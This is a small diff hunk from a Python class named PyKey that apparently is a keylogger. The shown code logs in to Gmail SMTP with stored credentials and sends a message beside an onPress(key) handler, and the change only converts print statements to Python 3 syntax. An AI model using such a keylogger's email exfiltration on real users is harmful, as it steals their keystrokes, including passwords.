@@ -97,9 +97,9 @@ class PyKey:
             server.login(self.GMAIL_USER, self.GMAIL_PWD)
             server.sendmail(self.EMAIL_FROM, self.EMAIL_TO, message)
             server.close()
-            print 'successfully sent the mail'
+            print("successfully sent the mail")
         except:
-            print "failed to send mail"
+            print("failed to send mail")
 
 
     def onPress(self, key):
